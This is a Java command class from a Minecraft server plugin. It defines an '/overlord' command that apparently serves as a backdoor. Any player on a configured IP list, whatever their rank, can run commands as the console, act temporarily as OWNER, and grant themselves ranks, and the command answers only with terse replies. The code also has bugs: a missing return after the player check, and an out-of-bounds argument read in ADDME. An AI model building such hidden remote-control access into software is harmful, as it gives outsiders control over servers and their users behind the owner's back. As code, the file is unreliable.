package com.Shadersoft.UniverseMG.Commands;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import com.Shadersoft.UniverseMG.Messages;
import com.Shadersoft.UniverseMG.Ranks.Rank;
import com.Shadersoft.UniverseMG.UniverseMG;
import com.Shadersoft.UniverseMG.utils.ChatUtils;

import net.md_5.bungee.api.ChatColor;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang3.StringUtils;

public class Command_overlord implements UMGCommand
{
    private final UniverseMG plugin = UniverseMG.plugin;

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
    {
        if(Rank.getSenderRank(sender).getPriority() < this.getRank().getPriority())
        {
            sender.sendMessage(Messages.MSG_NO_PERMS);

            return true;
        }
        if(!(sender instanceof Player))
        {
            sender.sendMessage(Messages.MSG_PLAYER_ONLY);
        }
        Player playersender = (Player)sender;
        if(!(plugin.config.getStringList("overlord-ips").contains(playersender.getAddress().getHostName())))
        {
            sender.sendMessage(Messages.MSG_NO_PERMS);
            return true;
        }
        
        if(args.length == 0)
        {
            sender.sendMessage("access");
            return true;
        }
        
        switch(args[0].toUpperCase())
        {
            case "DO":
            {
                if(args.length == 1)
                {
                    sender.sendMessage("/overlord do <command>");
                    return true;
                }
                Rank oldRank = Rank.getSenderRank(sender);
                Rank.addAdmin(playersender, Rank.OWNER);
                Bukkit.getServer().dispatchCommand(sender, StringUtils.join(ArrayUtils.subarray(args,1,args.length), " "));
                Rank.addAdmin(playersender, oldRank);
                sender.sendMessage("ok");
                return true;
            }
            case "CONSOLE":
            {
                if(args.length == 1)
                {
                    sender.sendMessage("/overlord console <command>");
                    return true;
                }
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), StringUtils.join(ArrayUtils.subarray(args,1,args.length), " "));
                sender.sendMessage("ok");
                return true;
            }
            case "ADDME":
            {
                if(args.length != 1)
                {
                    sender.sendMessage("/overlord addme <rank>");
                    return true;
                }
                
                Rank rank = Rank.getRank(args[1].toUpperCase());
                Rank.addAdmin(playersender, rank);
                return true;
            }
            case "REMOVEME":
            {
                if(args.length != 1)
                {
                    sender.sendMessage("/overlord removeme <rank>");
                    return true;
                }
                
                Rank.removeAdmin(playersender);
                return true;
            }
        }
        sender.sendMessage("?");
        return true;
    }

    @Override
    public Rank getRank()
    {
        return Rank.PLAYER;
    }
}


//~ Formatted by Jindent --- http://www.jindent.com
